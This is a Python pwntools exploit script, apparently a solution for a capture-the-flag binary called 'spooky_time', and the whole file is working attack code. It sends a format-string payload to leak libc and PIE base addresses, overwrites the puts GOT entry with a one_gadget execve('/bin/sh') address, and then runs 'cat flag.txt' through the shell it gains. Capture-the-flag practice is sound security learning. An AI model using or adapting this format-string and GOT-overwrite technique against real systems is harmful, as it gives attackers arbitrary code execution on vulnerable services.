#!/usr/bin/env python3

from pwn import *
import sys

context.arch = "amd64"

def exploit(io, elf, libc):

    payload = b"%3$lx%57$lx"
    io.sendafter(b"scary!\n", payload)
    io.recvuntil(b"than \n")
    libc_leak = int(io.recv(12), 16)
    pie_leak = int(io.recv(12),16)
    libc.address = libc_leak - 0x114a37
    elf.address = pie_leak - 0x13c0
    print("libc: ", hex(libc.address))
    print("pie base: ", hex(elf.address))
    
    puts_got = elf.got["puts"]
    execve_binsh = libc.address + 0xebcf5 # one_gadget
    fmt = fmtstr_payload(8, {puts_got: execve_binsh})
    io.sendlineafter(b"time..\n\n", fmt)
    io.clean()
    sleep(0.1)

    io.sendline(b"cat flag.txt")
    flag = io.recv().decode()
    print(flag)

def main():
    if sys.argv[1] == "debug":
        io = gdb.debug("./spooky_time")
    else: 
        HOST, PORT = sys.argv[1].split(":")
        io = remote(HOST, PORT)
    
    elf = ELF("./spooky_time")
    libc = ELF("./glibc/libc.so.6")
    exploit(io, elf, libc)





if __name__ == "__main__":
    main()
